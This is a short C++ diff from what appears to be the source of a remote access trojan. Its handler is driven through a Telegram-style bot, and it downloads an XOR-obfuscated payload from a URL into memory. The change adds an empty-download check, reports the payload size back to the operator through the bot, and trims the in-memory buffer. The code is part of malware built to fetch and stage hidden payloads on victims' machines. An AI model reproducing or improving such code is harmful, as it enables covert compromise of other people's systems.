@@ -100,17 +100,19 @@ void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
 		                  file_url);
 
 		HANDLER_DEBUG_LOG("XOR key :{}", this->state.payload_key);
-		auto result = downloadXoredPayload(file_url);
 
-		this->state.payload_uncompressed_size = result.size;
-		HANDLER_DEBUG_LOG("File downloaded with uncompressed size {} ",
-		                  this->state.payload_uncompressed_size);
+		const auto& result = downloadXoredPayload(file_url);
+		if(result.size == 0) {
+			HANDLER_ERROR_LOG("Downloaded empty file or failed to download");
+			return;
+		}
+		this->bot->sendMessage(fmt::format("Downloaded payload into RAM with uncompressed size {}", this->state.payload.size()));
+
+		this->state.payload.shrink_to_fit();
+
 	}
 
-	HANDLER_DEBUG_LOG("Succeeded at downloading the payload into RAM "
-	                  "obfuscated, Number of Bytes from {} to {}",
-	                  this->state.payload_uncompressed_size,
-	                  this->state.payload.size());
+	HANDLER_DEBUG_LOG("Succeeded at downloading the payload into RAM ");
 }
 
 inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
